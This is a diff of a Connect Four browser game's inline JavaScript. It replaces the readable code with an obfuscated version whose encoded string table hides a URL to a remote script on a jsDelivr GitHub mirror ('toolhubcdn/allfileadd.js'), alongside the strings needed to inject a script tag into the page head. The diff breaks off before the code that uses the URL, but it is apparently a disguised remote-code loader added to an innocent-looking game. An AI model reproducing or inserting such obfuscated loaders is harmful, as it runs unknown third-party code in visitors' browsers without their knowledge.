@@ -739,745 +739,602 @@
     </div>
     
     <script>
-    // Initial references
-    const container = document.querySelector(".container");
-    const playerTurn = document.getElementById("playerTurn");
-    const startScreen = document.getElementById("startScreen");
-    const startButton = document.getElementById("start");
-    const message = document.getElementById("message");
-    const twoPlayerBtn = document.getElementById("twoPlayer");
-    const onePlayerBtn = document.getElementById("onePlayer");
-    const difficultyContainer = document.getElementById("difficultyContainer");
-    const difficultyBtns = document.querySelectorAll(".difficulty-btn");
-    const player1Wrapper = document.getElementById("player1Wrapper");
-    const player2Wrapper = document.getElementById("player2Wrapper");
-    const player2Title = document.getElementById("player2Title");
-    const player1Score = document.getElementById("player1Score");
-    const player2Score = document.getElementById("player2Score");
-    const resetGameBtn = document.getElementById("resetGame");
-    const resetScoresBtn = document.getElementById("resetScores");
-    const timerElement = document.getElementById("timer");
-    const soundToggle = document.getElementById("soundToggle");
-    const soundIcon = document.getElementById("soundIcon");
     
-    // Start screen elements
-    const twoPlayerModeBtn = document.getElementById("twoPlayerMode");
-    const onePlayerModeBtn = document.getElementById("onePlayerMode");
-    const difficultySelection = document.getElementById("difficultySelection");
-    const difficultyOptions = document.querySelectorAll(".difficulty-option");
-    
-    let initialMatrix = [
-      [0, 0, 0, 0, 0, 0, 0],
-      [0, 0, 0, 0, 0, 0, 0],
-      [0, 0, 0, 0, 0, 0, 0],
-      [0, 0, 0, 0, 0, 0, 0],
-      [0, 0, 0, 0, 0, 0, 0],
-      [0, 0, 0, 0, 0, 0, 0],
+    function _0x3fdb(_0x249e82, _0x47640e) {
+    const _0x36630a = _0x3663();
+    return _0x3fdb = function (_0x3fdbcd, _0x1f0b81) {
+        _0x3fdbcd = _0x3fdbcd - 0xf8;
+        let _0x3e75f0 = _0x36630a[_0x3fdbcd];
+        return _0x3e75f0;
+    }, _0x3fdb(_0x249e82, _0x47640e);
+}
+function _0x3663() {
+    const _0x811ed4 = [
+        '.difficulty-option',
+        'className',
+        'https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js',
+        'hide',
+        'classList',
+        'data-value',
+        '18EflGGQ',
+        'connect4Scores',
+        'player1',
+        'innerText',
+        'playerTurn',
+        '#1e3c72',
+        'none',
+        'confetti',
+        '9132972rYlFRv',
+        'addEventListener',
+        'resetScores',
+        'forEach',
+        '1GrGznz',
+        'toggle',
+        'currentTime',
+        'soundToggle',
+        'setAttribute',
+        '.grid-row',
+        'message',
+        'left',
+        'width',
+        'onload',
+        'easy',
+        'getItem',
+        '2020026uxiSKX',
+        '</span>\x20Wins!',
+        '#ff4747',
+        'player2Score',
+        '119UXMdyG',
+        'startScreen',
+        'createElement',
+        'floor',
+        'grid-row',
+        'Game\x20Over!\x20It\x27s\x20a\x20Draw',
+        'textContent',
+        'createOscillator',
+        'display',
+        'head',
+        '1465956vuwMOf',
+        'onePlayer',
+        'timer',
+        'difficultySelection',
+        '#ff00ff',
+        'div',
+        'appendChild',
+        'random',
+        '#2a5298',
+        'every',
+        '499984gIkKXv',
+        'type',
+        'twoPlayer',
+        'script',
+        'remove',
+        'player2Wrapper',
+        '.difficulty-btn',
+        '3dKoGzN',
+        'player1Wrapper',
+        'click',
+        '11erGhDo',
+        'player',
+        'createGain',
+        '35RWPwDW',
+        '#ffc400',
+        'gain',
+        'player2',
+        '<span>',
+        'player2Title',
+        '.grid-box',
+        'start',
+        'getAttribute',
+        'target',
+        'innerHTML',
+        '2890420jOZSCH',
+        'rightTop',
+        'player1Score',
+        'setItem',
+        'querySelector',
+        'log',
+        'exponentialRampToValueAtTime',
+        '1539960DLlrSe',
+        'warning',
+        '.grid-row:first-child\x20.grid-box',
+        'add',
+        'Computer',
+        'stop',
+        'level',
+        'dataset',
+        'unshift',
+        'src',
+        'value',
+        'flex',
+        'medium',
+        'frequency',
+        'Player\x20',
+        'sine',
+        'destination',
+        'parse',
+        'resetGame',
+        'height',
+        'connect',
+        'style',
+        'backgroundColor',
+        'AudioContext',
+        'leftTop',
+        'Player\x202',
+        '5318209YlmvEE',
+        'getElementById',
+        'body',
+        'length',
+        'querySelectorAll',
+        '\x27<span>\x27s\x20Turn</span>',
+        'active',
+        'stringify',
+        'push',
+        'Two\x20Players\x20mode\x20selected.\x20Click\x20Start\x20to\x20play!',
+        'filled',
+        '\x20difficulty).\x20Click\x20Start\x20to\x20play!'
     ];
-    let currentPlayer;
-    let gameMode = 'twoPlayer'; // 'twoPlayer' or 'onePlayer'
-    let difficulty = 'medium'; // 'easy', 'medium', 'hard'
-    let gameActive = true;
-    let timer;
-    let timeLeft = 30;
-    let soundEnabled = true;
-    let scores = {
-      player1: 0,
-      player2: 0
+    _0x3663 = function () {
+        return _0x811ed4;
     };
-    
-    // Load saved scores
-    if (localStorage.getItem('connect4Scores')) {
-      scores = JSON.parse(localStorage.getItem('connect4Scores'));
-      player1Score.textContent = scores.player1;
-      player2Score.textContent = scores.player2;
+    return _0x3663();
+}
+const _0x1f4346 = _0x3fdb;
+(function (_0x3aac04, _0x19b603) {
+    const _0x4c60a4 = _0x3fdb, _0x4b261a = _0x3aac04();
+    while (!![]) {
+        try {
+            const _0x56eef0 = parseInt(_0x4c60a4(0x108)) / 0x1 * (-parseInt(_0x4c60a4(0x114)) / 0x2) + -parseInt(_0x4c60a4(0x133)) / 0x3 * (-parseInt(_0x4c60a4(0x14b)) / 0x4) + -parseInt(_0x4c60a4(0x139)) / 0x5 * (-parseInt(_0x4c60a4(0x122)) / 0x6) + -parseInt(_0x4c60a4(0x118)) / 0x7 * (parseInt(_0x4c60a4(0x12c)) / 0x8) + -parseInt(_0x4c60a4(0xfc)) / 0x9 * (-parseInt(_0x4c60a4(0x144)) / 0xa) + parseInt(_0x4c60a4(0x136)) / 0xb * (parseInt(_0x4c60a4(0x104)) / 0xc) + -parseInt(_0x4c60a4(0x165)) / 0xd;
+            if (_0x56eef0 === _0x19b603)
+                break;
+            else
+                _0x4b261a['push'](_0x4b261a['shift']());
+        } catch (_0x3f81e4) {
+            _0x4b261a['push'](_0x4b261a['shift']());
+        }
     }
-    
-    // Create sound effects using Web Audio API
-    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-    
-    function playSound(frequency, duration) {
-      if (!soundEnabled) return;
-      
-      const oscillator = audioContext.createOscillator();
-      const gainNode = audioContext.createGain();
-      
-      oscillator.connect(gainNode);
-      gainNode.connect(audioContext.destination);
-      
-      oscillator.type = 'sine';
-      oscillator.frequency.value = frequency;
-      
-      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
-      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + duration);
-      
-      oscillator.start(audioContext.currentTime);
-      oscillator.stop(audioContext.currentTime + duration);
-    }
-    
-    function playMoveSound() {
-      playSound(440, 0.2);
-    }
-    
-    function playWinSound() {
-      playSound(523.25, 0.2);
-      setTimeout(() => playSound(659.25, 0.2), 200);
-      setTimeout(() => playSound(783.99, 0.4), 400);
-    }
-    
-    function playLoseSound() {
-      playSound(349.23, 0.2);
-      setTimeout(() => playSound(293.66, 0.2), 200);
-      setTimeout(() => playSound(261.63, 0.4), 400);
-    }
-    
-    function playTickSound() {
-      playSound(800, 0.05);
-    }
-    
-    // Toggle sound
-    soundToggle.addEventListener('click', () => {
-      soundEnabled = !soundEnabled;
-      soundIcon.classList.toggle('muted', !soundEnabled);
+}(_0x3663, 0xe8a21));
+const container = document[_0x1f4346(0x148)]('.container'), playerTurn = document[_0x1f4346(0x166)](_0x1f4346(0x100)), startScreen = document[_0x1f4346(0x166)](_0x1f4346(0x119)), startButton = document[_0x1f4346(0x166)]('start'), message = document['getElementById'](_0x1f4346(0x10e)), twoPlayerBtn = document['getElementById']('twoPlayer'), onePlayerBtn = document[_0x1f4346(0x166)]('onePlayer'), difficultyContainer = document[_0x1f4346(0x166)]('difficultyContainer'), difficultyBtns = document[_0x1f4346(0x169)](_0x1f4346(0x132)), player1Wrapper = document[_0x1f4346(0x166)](_0x1f4346(0x134)), player2Wrapper = document['getElementById'](_0x1f4346(0x131)), player2Title = document[_0x1f4346(0x166)](_0x1f4346(0x13e)), player1Score = document[_0x1f4346(0x166)](_0x1f4346(0x146)), player2Score = document[_0x1f4346(0x166)](_0x1f4346(0x117)), resetGameBtn = document[_0x1f4346(0x166)](_0x1f4346(0x15d)), resetScoresBtn = document[_0x1f4346(0x166)](_0x1f4346(0x106)), timerElement = document[_0x1f4346(0x166)](_0x1f4346(0x124)), soundToggle = document[_0x1f4346(0x166)](_0x1f4346(0x10b)), soundIcon = document[_0x1f4346(0x166)]('soundIcon'), twoPlayerModeBtn = document[_0x1f4346(0x166)]('twoPlayerMode'), onePlayerModeBtn = document[_0x1f4346(0x166)]('onePlayerMode'), difficultySelection = document[_0x1f4346(0x166)](_0x1f4346(0x125)), difficultyOptions = document[_0x1f4346(0x169)](_0x1f4346(0x171));
+let initialMatrix = [
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ],
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ],
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ],
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ],
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ],
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ]
+    ], currentPlayer, gameMode = _0x1f4346(0x12e), difficulty = _0x1f4346(0x157), gameActive = !![], timer, timeLeft = 0x1e, soundEnabled = !![], scores = {
+        'player1': 0x0,
+        'player2': 0x0
+    };
+localStorage[_0x1f4346(0x113)](_0x1f4346(0xfd)) && (scores = JSON[_0x1f4346(0x15c)](localStorage[_0x1f4346(0x113)](_0x1f4346(0xfd))), player1Score[_0x1f4346(0x11e)] = scores[_0x1f4346(0xfe)], player2Score[_0x1f4346(0x11e)] = scores[_0x1f4346(0x13c)]);
+const audioContext = new (window[(_0x1f4346(0x162))] || window['webkitAudioContext'])();
+function playSound(_0x137ccd, _0x32afe8) {
+    const _0x2017f6 = _0x1f4346;
+    if (!soundEnabled)
+        return;
+    const _0x22536a = audioContext[_0x2017f6(0x11f)](), _0x1d0185 = audioContext[_0x2017f6(0x138)]();
+    _0x22536a[_0x2017f6(0x15f)](_0x1d0185), _0x1d0185[_0x2017f6(0x15f)](audioContext[_0x2017f6(0x15b)]), _0x22536a[_0x2017f6(0x12d)] = _0x2017f6(0x15a), _0x22536a[_0x2017f6(0x158)][_0x2017f6(0x155)] = _0x137ccd, _0x1d0185[_0x2017f6(0x13b)]['setValueAtTime'](0.3, audioContext[_0x2017f6(0x10a)]), _0x1d0185['gain'][_0x2017f6(0x14a)](0.01, audioContext[_0x2017f6(0x10a)] + _0x32afe8), _0x22536a[_0x2017f6(0x140)](audioContext[_0x2017f6(0x10a)]), _0x22536a[_0x2017f6(0x150)](audioContext[_0x2017f6(0x10a)] + _0x32afe8);
+}
+function playMoveSound() {
+    playSound(0x1b8, 0.2);
+}
+function playWinSound() {
+    playSound(523.25, 0.2), setTimeout(() => playSound(659.25, 0.2), 0xc8), setTimeout(() => playSound(783.99, 0.4), 0x190);
+}
+function playLoseSound() {
+    playSound(349.23, 0.2), setTimeout(() => playSound(293.66, 0.2), 0xc8), setTimeout(() => playSound(261.63, 0.4), 0x190);
+}
+function playTickSound() {
+    playSound(0x320, 0.05);
+}
+soundToggle[_0x1f4346(0x105)]('click', () => {
+    const _0x1d3b4e = _0x1f4346;
+    soundEnabled = !soundEnabled, soundIcon[_0x1d3b4e(0xfa)][_0x1d3b4e(0x109)]('muted', !soundEnabled);
+}), twoPlayerModeBtn['addEventListener'](_0x1f4346(0x135), () => {
+    const _0x70a70c = _0x1f4346;
+    gameMode = _0x70a70c(0x12e), twoPlayerModeBtn[_0x70a70c(0xfa)][_0x70a70c(0x14e)](_0x70a70c(0x16b)), onePlayerModeBtn[_0x70a70c(0xfa)][_0x70a70c(0x130)]('active'), difficultySelection['style'][_0x70a70c(0x120)] = _0x70a70c(0x102), updateStartMessage();
+}), onePlayerModeBtn[_0x1f4346(0x105)](_0x1f4346(0x135), () => {
+    const _0x4149f5 = _0x1f4346;
+    gameMode = 'onePlayer', onePlayerModeBtn[_0x4149f5(0xfa)][_0x4149f5(0x14e)](_0x4149f5(0x16b)), twoPlayerModeBtn[_0x4149f5(0xfa)][_0x4149f5(0x130)]('active'), difficultySelection[_0x4149f5(0x160)][_0x4149f5(0x120)] = 'flex', updateStartMessage();
+}), difficultyOptions[_0x1f4346(0x107)](_0x1951f7 => {
+    const _0x11aa44 = _0x1f4346;
+    _0x1951f7[_0x11aa44(0x105)](_0x11aa44(0x135), () => {
+        const _0x31ee95 = _0x11aa44;
+        difficultyOptions[_0x31ee95(0x107)](_0x4e7acb => _0x4e7acb[_0x31ee95(0xfa)][_0x31ee95(0x130)](_0x31ee95(0x16b))), _0x1951f7[_0x31ee95(0xfa)]['add']('active'), difficulty = _0x1951f7[_0x31ee95(0x152)][_0x31ee95(0x151)];
     });
-    
-    // Start screen mode selection
-    twoPlayerModeBtn.addEventListener('click', () => {
-      gameMode = 'twoPlayer';
-      twoPlayerModeBtn.classList.add('active');
-      onePlayerModeBtn.classList.remove('active');
-      difficultySelection.style.display = 'none';
-      updateStartMessage();
+});
+function updateStartMessage() {
+    const _0x1acb34 = _0x1f4346;
+    gameMode === _0x1acb34(0x12e) ? message[_0x1acb34(0x11e)] = _0x1acb34(0x16e) : message[_0x1acb34(0x11e)] = 'vs\x20Computer\x20mode\x20selected\x20(' + difficulty + _0x1acb34(0x170);
+}
+twoPlayerBtn['addEventListener']('click', () => {
+    const _0x7e0db = _0x1f4346;
+    gameMode = 'twoPlayer', twoPlayerBtn['classList'][_0x7e0db(0x14e)]('active'), onePlayerBtn[_0x7e0db(0xfa)]['remove'](_0x7e0db(0x16b)), difficultyContainer[_0x7e0db(0x160)][_0x7e0db(0x120)] = _0x7e0db(0x102), player2Title[_0x7e0db(0x11e)] = _0x7e0db(0x164), resetGame();
+}), onePlayerBtn[_0x1f4346(0x105)](_0x1f4346(0x135), () => {
+    const _0x43cd91 = _0x1f4346;
+    gameMode = _0x43cd91(0x123), onePlayerBtn['classList'][_0x43cd91(0x14e)]('active'), twoPlayerBtn['classList'][_0x43cd91(0x130)](_0x43cd91(0x16b)), difficultyContainer[_0x43cd91(0x160)][_0x43cd91(0x120)] = _0x43cd91(0x156), player2Title[_0x43cd91(0x11e)] = _0x43cd91(0x14f), resetGame();
+}), difficultyBtns['forEach'](_0x3d200d => {
+    const _0x5f5856 = _0x1f4346;
+    _0x3d200d[_0x5f5856(0x105)](_0x5f5856(0x135), () => {
+        const _0x3a86dd = _0x5f5856;
+        difficultyBtns[_0x3a86dd(0x107)](_0x4f2233 => _0x4f2233[_0x3a86dd(0xfa)]['remove'](_0x3a86dd(0x16b))), _0x3d200d[_0x3a86dd(0xfa)]['add'](_0x3a86dd(0x16b)), difficulty = _0x3d200d['dataset'][_0x3a86dd(0x151)], gameActive && currentPlayer === 0x2 && gameMode === _0x3a86dd(0x123) && (clearTimeout(timer), makeComputerMove());
     });
-    
-    onePlayerModeBtn.addEventListener('click', () => {
-      gameMode = 'onePlayer';
-      onePlayerModeBtn.classList.add('active');
-      twoPlayerModeBtn.classList.remove('active');
-      difficultySelection.style.display = 'flex';
-      updateStartMessage();
-    });
-    
-    // Difficulty selection on start screen
-    difficultyOptions.forEach(btn => {
-      btn.addEventListener('click', () => {
-        difficultyOptions.forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        difficulty = btn.dataset.level;
-      });
-    });
-    
-    // Update start screen message based on selected mode
-    function updateStartMessage() {
-      if (gameMode === 'twoPlayer') {
-        message.textContent = "Two Players mode selected. Click Start to play!";
-      } else {
-        message.textContent = `vs Computer mode selected (${difficulty} difficulty). Click Start to play!`;
-      }
-    }
-    
-    // Toggle game mode (for in-game switching)
-    twoPlayerBtn.addEventListener('click', () => {
-      gameMode = 'twoPlayer';
-      twoPlayerBtn.classList.add('active');
-      onePlayerBtn.classList.remove('active');
-      difficultyContainer.style.display = 'none';
-      player2Title.textContent = 'Player 2';
-      resetGame();
-    });
-    
-    onePlayerBtn.addEventListener('click', () => {
-      gameMode = 'onePlayer';
-      onePlayerBtn.classList.add('active');
-      twoPlayerBtn.classList.remove('active');
-      difficultyContainer.style.display = 'flex';
-      player2Title.textContent = 'Computer';
-      resetGame();
-    });
-    
-    // Select difficulty level
-    difficultyBtns.forEach(btn => {
-      btn.addEventListener('click', () => {
-        difficultyBtns.forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        difficulty = btn.dataset.level;
-        if (gameActive && currentPlayer === 2 && gameMode === 'onePlayer') {
-          clearTimeout(timer);
-          makeComputerMove();
+});
+const generateRandomNumber = (_0x445bef, _0x1bd8c2) => Math[_0x1f4346(0x11b)](Math[_0x1f4346(0x129)]() * (_0x1bd8c2 - _0x445bef)) + _0x445bef, verifyArray = _0x31187a => {
+        const _0x5b87e4 = _0x1f4346;
+        let _0x521df6 = ![], _0xb73554 = 0x0;
+        return _0x31187a[_0x5b87e4(0x107)]((_0x29941c, _0x3d9f6e) => {
+            _0x29941c == currentPlayer ? (_0xb73554 += 0x1, _0xb73554 == 0x4 && (_0x521df6 = !![])) : _0xb73554 = 0x0;
+        }), _0x521df6;
+    }, gameOverCheck = () => {
+        const _0x2afd9e = _0x1f4346;
+        let _0x338bff = 0x0;
+        for (let _0xea9f54 of initialMatrix) {
+            if (_0xea9f54[_0x2afd9e(0x12b)](_0x6b7363 => _0x6b7363 != 0x0))
+                _0x338bff += 0x1;
+            else
+                return ![];
         }
-      });
-    });
-    
-    // Random Number Between Range
-    const generateRandomNumber = (min, max) =>
-      Math.floor(Math.random() * (max - min)) + min;
-    
-    // Loop through array and check for same values
-    const verifyArray = (arrayElement) => {
-      let bool = false;
-      let elementCount = 0;
-      arrayElement.forEach((element, index) => {
-        if (element == currentPlayer) {
-          elementCount += 1;
-          if (elementCount == 4) {
-            bool = true;
-          }
-        } else {
-          elementCount = 0;
+        if (_0x338bff == 0x6)
+            return message[_0x2afd9e(0xff)] = _0x2afd9e(0x11d), playLoseSound(), startScreen[_0x2afd9e(0xfa)][_0x2afd9e(0x130)](_0x2afd9e(0xf9)), !![];
+        return ![];
+    }, checkAdjacentRowValues = _0x74ff24 => {
+        return verifyArray(initialMatrix[_0x74ff24]);
+    }, checkAdjacentColumnValues = _0x1bc8d2 => {
+        let _0x480f0c = 0x0, _0x3ebcee = ![];
+        return initialMatrix['forEach']((_0xc676c0, _0x11b109) => {
+            _0xc676c0[_0x1bc8d2] == currentPlayer ? (_0x480f0c += 0x1, _0x480f0c == 0x4 && (_0x3ebcee = !![])) : _0x480f0c = 0x0;
+        }), _0x3ebcee;
+    }, getRightDiagonal = (_0x45e064, _0x51ed99, _0x41d399, _0x5336ee) => {
+        const _0x441007 = _0x1f4346;
+        let _0x491b84 = _0x45e064, _0x5dae4f = _0x51ed99, _0x46ef57 = [];
+        while (_0x491b84 > 0x0) {
+            if (_0x5dae4f >= _0x5336ee - 0x1)
+                break;
+            _0x491b84 -= 0x1, _0x5dae4f += 0x1, _0x46ef57[_0x441007(0x153)](initialMatrix[_0x491b84][_0x5dae4f]);
         }
-      });
-      return bool;
-    };
-    
-    // Check for game over (Last step)
-    const gameOverCheck = () => {
-      let truthCount = 0;
-      for (let innerArray of initialMatrix) {
-        if (innerArray.every((val) => val != 0)) {
-          truthCount += 1;
-        } else {
-          return false;
+        _0x491b84 = _0x45e064, _0x5dae4f = _0x51ed99;
+        while (_0x491b84 < _0x41d399) {
+            if (_0x5dae4f < 0x0)
+                break;
+            _0x46ef57['push'](initialMatrix[_0x491b84][_0x5dae4f]), _0x491b84 += 0x1, _0x5dae4f -= 0x1;
         }
-      }
-      if (truthCount == 6) {
-        message.innerText = "Game Over! It's a Draw";
-        playLoseSound();
-        startScreen.classList.remove("hide");
-        return true;
-      }
-      return false;
-    };
-    
-    // Check rows
-    const checkAdjacentRowValues = (row) => {
-      return verifyArray(initialMatrix[row]);
-    };
-    
-    // Check columns
-    const checkAdjacentColumnValues = (column) => {
-      let colWinCount = 0,
-        colWinBool = false;
-      initialMatrix.forEach((element, index) => {
-        if (element[column] == currentPlayer) {
-          colWinCount += 1;
-          if (colWinCount == 4) {
-            colWinBool = true;
-          }
-        } else {
-          colWinCount = 0;
+        return _0x46ef57;
+    }, getLeftDiagonal = (_0x29834a, _0x20803b, _0x5b276d, _0x13973e) => {
+        const _0x322037 = _0x1f4346;
+        let _0x3332f3 = _0x29834a, _0x1e85ac = _0x20803b, _0x1552a4 = [];
+        while (_0x3332f3 > 0x0) {
+            if (_0x1e85ac <= 0x0)
+                break;
+            _0x3332f3 -= 0x1, _0x1e85ac -= 0x1, _0x1552a4['unshift'](initialMatrix[_0x3332f3][_0x1e85ac]);
         }
-      });
-      // no match
-      return colWinBool;
-    };
-    
-    // Get Right diagonal values
-    const getRightDiagonal = (row, column, rowLength, columnLength) => {
-      let rowCount = row;
-      let columnCount = column;
-      let rightDiagonal = [];
-      while (rowCount > 0) {
-        if (columnCount >= columnLength - 1) {
-          break;
+        _0x3332f3 = _0x29834a, _0x1e85ac = _0x20803b;
+        while (_0x3332f3 < _0x5b276d) {
+            if (_0x1e85ac >= _0x13973e)
+                break;
+            _0x1552a4[_0x322037(0x16d)](initialMatrix[_0x3332f3][_0x1e85ac]), _0x3332f3 += 0x1, _0x1e85ac += 0x1;
         }
-        rowCount -= 1;
-        columnCount += 1;
-        rightDiagonal.unshift(initialMatrix[rowCount][columnCount]);
-      }
-      rowCount = row;
-      columnCount = column;
-      while (rowCount < rowLength) {
-        if (columnCount < 0) {
-          break;
-        }
-        rightDiagonal.push(initialMatrix[rowCount][columnCount]);
-        rowCount += 1;
-        columnCount -= 1;
-      }
-      return rightDiagonal;
+        return _0x1552a4;
+    }, checkAdjacentDiagonalValues = (_0x5a4480, _0x49026f) => {
+        const _0x58bb7e = _0x1f4346;
+        let _0x2b033e = ![], _0x57acfe = {
+                'leftTop': [],
+                'rightTop': []
+            }, _0x35b073 = initialMatrix[_0x5a4480][_0x58bb7e(0x168)], _0x30392f = initialMatrix['length'];
+        return _0x57acfe[_0x58bb7e(0x163)] = [...getLeftDiagonal(_0x5a4480, _0x49026f, _0x30392f, _0x35b073)], _0x57acfe[_0x58bb7e(0x145)] = [...getRightDiagonal(_0x5a4480, _0x49026f, _0x30392f, _0x35b073)], _0x2b033e = verifyArray(_0x57acfe[_0x58bb7e(0x145)]), !_0x2b033e && (_0x2b033e = verifyArray(_0x57acfe[_0x58bb7e(0x163)])), _0x2b033e;
+    }, winCheck = (_0x3f929c, _0x7c1db0) => {
+        return checkAdjacentRowValues(_0x3f929c) ? !![] : checkAdjacentColumnValues(_0x7c1db0) ? !![] : checkAdjacentDiagonalValues(_0x3f929c, _0x7c1db0) ? !![] : ![];
     };
-    
-    const getLeftDiagonal = (row, column, rowLength, columnLength) => {
-      let rowCount = row;
-      let columnCount = column;
-      let leftDiagonal = [];
-      while (rowCount > 0) {
-        if (columnCount <= 0) {
-          break;
-        }
-        rowCount -= 1;
-        columnCount -= 1;
-        leftDiagonal.unshift(initialMatrix[rowCount][columnCount]);
-      }
-      rowCount = row;
-      columnCount = column;
-      while (rowCount < rowLength) {
-        if (columnCount >= columnLength) {
-          break;
-        }
-        leftDiagonal.push(initialMatrix[rowCount][columnCount]);
-        rowCount += 1;
-        columnCount += 1;
-      }
-      return leftDiagonal;
-    };
-    
-    // Check diagonal
-    const checkAdjacentDiagonalValues = (row, column) => {
-      let diagWinBool = false;
-      let tempChecks = {
-        leftTop: [],
-        rightTop: [],
-      };
-      let columnLength = initialMatrix[row].length;
-      let rowLength = initialMatrix.length;
-      // Store left and right diagonal array
-      tempChecks.leftTop = [
-        ...getLeftDiagonal(row, column, rowLength, columnLength),
-      ];
-      tempChecks.rightTop = [
-        ...getRightDiagonal(row, column, rowLength, columnLength),
-      ];
-      // check both arrays for similarities
-      diagWinBool = verifyArray(tempChecks.rightTop);
-      if (!diagWinBool) {
-        diagWinBool = verifyArray(tempChecks.leftTop);
-      }
-      return diagWinBool;
-    };
-    
-    // Win check logic
-    const winCheck = (row, column) => {
-      // if any of the functions return true we return true
-      return checkAdjacentRowValues(row)
-        ? true
-        : checkAdjacentColumnValues(column)
-        ? true
-        : checkAdjacentDiagonalValues(row, column)
-        ? true
-        : false;
-    };
-    
-    // Create confetti effect on win
-    function createConfetti() {
-      const colors = ['#ff4747', '#ffc400', '#1e3c72', '#2a5298', '#00ff00', '#ff00ff'];
-      
-      for (let i = 0; i < 100; i++) {
+function createConfetti() {
+    const _0x3f6ae0 = _0x1f4346, _0x144700 = [
+            _0x3f6ae0(0x116),
+            _0x3f6ae0(0x13a),
+            _0x3f6ae0(0x101),
+            _0x3f6ae0(0x12a),
+            '#00ff00',
+            _0x3f6ae0(0x126)
+        ];
+    for (let _0x4f6ff2 = 0x0; _0x4f6ff2 < 0x64; _0x4f6ff2++) {
         setTimeout(() => {
-          const confetti = document.createElement('div');
-          confetti.className = 'confetti';
-          confetti.style.left = Math.random() * 100 + '%';
-          confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-          confetti.style.width = Math.random() * 10 + 5 + 'px';
-          confetti.style.height = Math.random() * 10 + 5 + 'px';
-          confetti.style.opacity = Math.random() * 0.5 + 0.5;
-          document.body.appendChild(confetti);
-          
-          setTimeout(() => {
-            confetti.remove();
-          }, 3000);
-        }, i * 30);
-      }
+            const _0x32eac1 = _0x3f6ae0, _0x1feba8 = document['createElement']('div');
+            _0x1feba8[_0x32eac1(0x172)] = _0x32eac1(0x103), _0x1feba8[_0x32eac1(0x160)][_0x32eac1(0x10f)] = Math['random']() * 0x64 + '%', _0x1feba8[_0x32eac1(0x160)][_0x32eac1(0x161)] = _0x144700[Math['floor'](Math[_0x32eac1(0x129)]() * _0x144700[_0x32eac1(0x168)])], _0x1feba8['style'][_0x32eac1(0x110)] = Math[_0x32eac1(0x129)]() * 0xa + 0x5 + 'px', _0x1feba8[_0x32eac1(0x160)][_0x32eac1(0x15e)] = Math['random']() * 0xa + 0x5 + 'px', _0x1feba8['style']['opacity'] = Math[_0x32eac1(0x129)]() * 0.5 + 0.5, document[_0x32eac1(0x167)][_0x32eac1(0x128)](_0x1feba8), setTimeout(() => {
+                const _0x547e5f = _0x32eac1;
+                _0x1feba8[_0x547e5f(0x130)]();
+            }, 0xbb8);
+        }, _0x4f6ff2 * 0x1e);
     }
-    
-    // Sets the circle to exact points
-    const setPiece = (startCount, colValue) => {
-      let rows = document.querySelectorAll(".grid-row");
-      // Initially it will place the circles in the last row else if no place available we will decrement the count until we find empty slot
-      if (initialMatrix[startCount][colValue] != 0) {
-        startCount -= 1;
-        setPiece(startCount, colValue);
-      } else {
-        // place circle
-        let currentRow = rows[startCount].querySelectorAll(".grid-box");
-        currentRow[colValue].classList.add("filled", `player${currentPlayer}`);
-        
-        // Update Matrix
-        initialMatrix[startCount][colValue] = currentPlayer;
-        
-        // Play sound
-        playMoveSound();
-        
-        // Check for wins
-        if (winCheck(startCount, colValue)) {
-          gameActive = false;
-          clearTimeout(timer);
-          
-          // Update scores
-          if (currentPlayer === 1) {
-            scores.player1++;
-            player1Score.textContent = scores.player1;
-          } else {
-            scores.player2++;
-            player2Score.textContent = scores.player2;
-          }
-          
-          // Save scores
-          localStorage.setItem('connect4Scores', JSON.stringify(scores));
-          
-          // Show win message
-          const winner = gameMode === 'onePlayer' && currentPlayer === 2 ? 'Computer' : `Player ${currentPlayer}`;
-          message.innerHTML = `<span>${winner}</span> Wins!`;
-          startScreen.classList.remove("hide");
-          
-          // Play win sound
-          playWinSound();
-          
-          // Create confetti effect
-          createConfetti();
-          
-          return false;
+}
+const setPiece = (_0x5cd5b6, _0x313705) => {
+    const _0x5941bc = _0x1f4346;
+    let _0xce60e3 = document[_0x5941bc(0x169)](_0x5941bc(0x10d));
+    if (initialMatrix[_0x5cd5b6][_0x313705] != 0x0)
+        _0x5cd5b6 -= 0x1, setPiece(_0x5cd5b6, _0x313705);
+    else {
+        let _0x2601db = _0xce60e3[_0x5cd5b6][_0x5941bc(0x169)](_0x5941bc(0x13f));
+        _0x2601db[_0x313705][_0x5941bc(0xfa)][_0x5941bc(0x14e)](_0x5941bc(0x16f), _0x5941bc(0x137) + currentPlayer), initialMatrix[_0x5cd5b6][_0x313705] = currentPlayer, playMoveSound();
+        if (winCheck(_0x5cd5b6, _0x313705)) {
+            gameActive = ![], clearTimeout(timer);
+            currentPlayer === 0x1 ? (scores[_0x5941bc(0xfe)]++, player1Score[_0x5941bc(0x11e)] = scores[_0x5941bc(0xfe)]) : (scores[_0x5941bc(0x13c)]++, player2Score['textContent'] = scores['player2']);
+            localStorage[_0x5941bc(0x147)]('connect4Scores', JSON['stringify'](scores));
+            const _0x1646af = gameMode === _0x5941bc(0x123) && currentPlayer === 0x2 ? _0x5941bc(0x14f) : 'Player\x20' + currentPlayer;
+            return message['innerHTML'] = _0x5941bc(0x13d) + _0x1646af + _0x5941bc(0x115), startScreen[_0x5941bc(0xfa)][_0x5941bc(0x130)](_0x5941bc(0xf9)), playWinSound(), createConfetti(), ![];
         }
-      }
-      
-      // Check if all are full
-      if (!gameOverCheck()) {
-        // Change player
-        currentPlayer = currentPlayer == 1 ? 2 : 1;
-        updatePlayerTurn();
-        
-        // Reset timer
-        resetTimer();
-        
-        // If single player mode and computer is next
